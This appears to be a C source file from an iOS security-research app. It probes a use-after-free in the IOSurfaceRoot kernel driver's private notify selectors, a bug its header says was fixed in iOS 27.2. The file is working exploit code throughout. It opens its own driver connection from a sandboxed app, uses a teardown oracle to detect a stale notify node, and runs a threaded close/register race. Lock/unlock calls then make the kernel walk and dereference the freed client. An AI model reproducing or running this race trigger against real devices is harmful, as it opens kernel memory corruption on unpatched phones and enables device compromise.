//
//  IOSurfaceRaceProbe.c
//  AGXProbe
//
//  Private-connection probe for the IOSurface notify lifetime bug fixed in
//  iOS 27.2 (CVE-2026-112477 class).
//
//  The 27.0.1 IOSurfaceRootUserClient implements two private selectors:
//      0x11 (17)  set surface notify      - structureInput 0x18, allowAsync
//      0x12 (18)  remove surface notify   - structureInput 0x18, sync
//  Both take {u64 +0, u64 +8 = key, u64 +0x10} and match nodes by
//  (key == input[1]) && (node->bound == client).  The registration is bound to
//  the IOSurfaceRootUserClient that issued it, so an app that opens its OWN
//  connection (instead of using IOSurface.framework's cached shared port) owns
//  a notifier client it can close.
//
//  Stages:
//    P1  ABI validation on an app-opened connection: register / remove /
//        register again, each result logged.
//    P2  teardown oracle: register on connection A, close A, then open fresh
//        connections and re-register the same key.  A duplicate error
//        (0xE00002C9) means a node with that key still exists AND the new
//        client reused the freed client's address -- i.e. the node survived
//        unlinkByObject, which is the state the 27.2 patch guards against.
//    P3  (only when race_rounds > 0) bounded close/register race plus a
//        notify-walk trigger (IOSurfaceLock/Unlock) on the secondary device.
//
//  Every line is mirrored to stdout as well as the app session log, because
//  log_from_c alone does not reach `devicectl --console`.
//

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern void log_from_c(const char *msg);

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*create_fn)(CFDictionaryRef);
typedef uint32_t (*get_id_fn)(IOSurfaceRef);
typedef int (*lock_fn)(IOSurfaceRef);
typedef int (*unlock_fn)(IOSurfaceRef, uint32_t);

static create_fn gCreate;
static get_id_fn gGetID;
static lock_fn gLock;
static unlock_fn gUnlock;

static void say(const char *fmt, ...)
{
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    log_from_c(buf);
    fputs(buf, stdout);
    fputc('\n', stdout);
    fflush(stdout);
}

static const char *krname(uint32_t kr)
{
    switch (kr) {
    case 0:          return "OK";
    case 0xe00002c2: return "BadArgument";
    case 0xe00002c9: return "Duplicate";
    case 0xe00002d8: return "NotAttached";
    case 0xe00002bc: return "Unsupported";
    default:         return "?";
    }
}

static int load_surface_syms(void)
{
    if (gCreate) return 1;
    void *fh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                      RTLD_NOW);
    if (!fh) fh = dlopen("IOSurface", RTLD_NOW);
    if (!fh) return 0;
    gCreate = (create_fn)dlsym(fh, "IOSurfaceCreate");
    gGetID  = (get_id_fn)dlsym(fh, "IOSurfaceGetID");
    gLock   = (lock_fn)dlsym(fh, "IOSurfaceLock");
    gUnlock = (unlock_fn)dlsym(fh, "IOSurfaceUnlock");
    return (gCreate && gGetID) ? 1 : 0;
}

static IOSurfaceRef make_surface(void)
{
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!props) return NULL;
    CFNumberRef w = CFNumberCreate(NULL, kCFNumberIntType, &(int){256});
    CFNumberRef h = CFNumberCreate(NULL, kCFNumberIntType, &(int){256});
    CFNumberRef bpe = CFNumberCreate(NULL, kCFNumberIntType, &(int){4});
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), w);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), h);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bpe);
    IOSurfaceRef s = gCreate(props);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(props);
    return s;
}

// Open our own IOSurfaceRoot user client.  Type 0 is the variant the device
// sweep proved opens from a sandboxed app.
static io_connect_t open_root(uint32_t type, uint32_t *out_kr)
{
    *out_kr = 0xffffffff;
    CFMutableDictionaryRef m = IOServiceMatching("IOSurfaceRoot");
    if (!m) return 0;
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
    if (!svc) { *out_kr = 0xfffffffe; return 0; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, type, &conn);
    IOObjectRelease(svc);
    *out_kr = (uint32_t)kr;
    return (kr == KERN_SUCCESS) ? conn : 0;
}

// Selector 0x11: set surface notify.  Mirrors the framework wrapper exactly:
// reference = {0, a, b}, structureInput = {a, b, 0}, async wake port.
static kern_return_t notify_register(io_connect_t conn, mach_port_t wake,
                                     uint64_t a, uint64_t b)
{
    uint64_t ref[3] = { 0, a, b };
    uint64_t in[3]  = { a, b, 0 };
    return (uint32_t)IOConnectCallAsyncMethod(conn, 0x11, wake, ref, 3,
                                              NULL, 0, in, sizeof in,
                                              NULL, NULL, NULL, NULL);
}

// Selector 0x12: remove surface notify, synchronous, structureInput {a, b, 0}.
static kern_return_t notify_remove(io_connect_t conn, uint64_t a, uint64_t b)
{
    uint64_t in[3] = { a, b, 0 };
    return (uint32_t)IOConnectCallMethod(conn, 0x12, NULL, 0, in, sizeof in,
                                         NULL, NULL, NULL, NULL);
}

// ---------------------------------------------------------------- P3 race ---

typedef struct {
    io_connect_t conn;
    mach_port_t wake;
    uint64_t key;
    volatile int stop;
    volatile int calls;
    volatile int ok;
    volatile int dup;
    volatile int err;
} race_arg_t;

static void *race_register_thread(void *p)
{
    race_arg_t *ra = (race_arg_t *)p;
    while (!ra->stop) {
        uint32_t kr = (uint32_t)notify_register(ra->conn, ra->wake, 1, ra->key);
        ra->calls++;
        if (kr == 0) ra->ok++;
        else if (kr == 0xe00002c9) ra->dup++;
        else ra->err++;
    }
    return NULL;
}

void run_ionotify_probe(int race_rounds)
{
    say("[*] ionotify v1 start (private IOSurfaceRoot connection, notify ABI)");

    if (!load_surface_syms()) { say("[-] IOSurface syms unavailable"); return; }

    mach_port_t wake = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(),
                                          MACH_PORT_RIGHT_RECEIVE, &wake);
    say("[*] wake port 0x%x kr=0x%x (%s)", (unsigned)wake,
        (unsigned)kr, krname((uint32_t)kr));
    if (kr != KERN_SUCCESS) return;

    IOSurfaceRef surf = make_surface();
    if (!surf) { say("[-] IOSurfaceCreate failed"); return; }
    uint32_t sid = gGetID(surf);
    say("[+] surface id 0x%x", sid);

    // ---------------- P1: raw selector ABI on our own connection -----------
    uint32_t okr = 0;
    io_connect_t a = open_root(0, &okr);
    say("[P1] IOServiceOpen(type 0) -> conn=0x%x kr=0x%x (%s)",
        (unsigned)a, okr, krname(okr));
    if (!a) { say("[-] P1 cannot open a private connection; stopping"); return; }

    uint32_t r1 = (uint32_t)notify_register(a, wake, 1, sid);
    say("[P1] register  #1 (async sel 0x11) -> kr=0x%x (%s)", r1, krname(r1));
    uint32_t r2 = (uint32_t)notify_remove(a, 1, sid);
    say("[P1] remove       (sync  sel 0x12) -> kr=0x%x (%s)", r2, krname(r2));
    uint32_t r3 = (uint32_t)notify_register(a, wake, 1, sid);
    say("[P1] register  #2 (async sel 0x11) -> kr=0x%x (%s)", r3, krname(r3));

    // ---------------- P2: does closing the client unlink its node? ---------
    uint32_t ck = (uint32_t)IOServiceClose(a);
    say("[P2] IOServiceClose(A) -> kr=0x%x (%s)", ck, krname(ck));
    usleep(200000);

    int dup_seen = 0;
    for (int i = 0; i < 8; i++) {
        uint32_t bkr = 0;
        io_connect_t b = open_root(0, &bkr);
        if (!b) { say("[P2] iter %d open failed kr=0x%x (%s)", i, bkr, krname(bkr)); break; }
        uint32_t rr = (uint32_t)notify_register(b, wake, 1, sid);
        uint32_t rm = (uint32_t)notify_remove(b, 1, sid);
        if (rr == 0xe00002c9) dup_seen++;
        say("[P2] iter %d newconn=0x%x register=0x%x (%s) remove=0x%x (%s)",
            i, (unsigned)b, rr, krname(rr), rm, krname(rm));
        IOServiceClose(b);
        usleep(20000);
    }
    say("[P2] VERDICT stale_node_survived_teardown=%s (duplicate-on-reregister count %d/8)",
        dup_seen ? "YES" : "no", dup_seen);

    // ---------------- P3: bounded close/register race + notify trigger ------
    if (race_rounds > 0) {
        say("[P3] bounded race, %d rounds (secondary device only)", race_rounds);
        int crashes_before = 0; (void)crashes_before;
        int won = 0;
        for (int i = 0; i < race_rounds; i++) {
            uint32_t pkr = 0;
            io_connect_t c = open_root(0, &pkr);
            if (!c) { say("[P3] round %d open failed kr=0x%x", i, pkr); break; }
            uint32_t rg = (uint32_t)notify_register(c, wake, 1, sid);
            if (rg != 0) say("[P3] round %d pre-register kr=0x%x (%s)", i, rg, krname(rg));

            race_arg_t ra;
            memset(&ra, 0, sizeof ra);
            ra.conn = c; ra.wake = wake; ra.key = sid;
            pthread_t th;
            pthread_create(&th, NULL, race_register_thread, &ra);

            // Let a few registrations land, then close under the worker.
            for (int k = 0; k < 5; k++) {
                (void)notify_register(c, wake, 1, sid);
                usleep(200);
            }
            IOServiceClose(c);
            usleep(2000);
            ra.stop = 1;
            pthread_join(th, NULL);

            // Trigger the notify walker through the public surface API.  If a
            // node bound to the freed client survived, this dereferences it.
            if (gLock && gUnlock) {
                for (int k = 0; k < 20; k++) {
                    (void)gLock(surf);
                    (void)gUnlock(surf, 0);
                }
            }
            if (ra.ok > 0) won++;
            say("[P3] round %d reg-calls=%d ok=%d dup=%d err=%d (pre-register node kept)",
                i, ra.calls, ra.ok, ra.dup, ra.err);
        }
        say("[P3] VERDICT race_register_ok_rounds=%d/%d", won, race_rounds);
    }

    say("[*] ionotify probe finished, app alive");
}
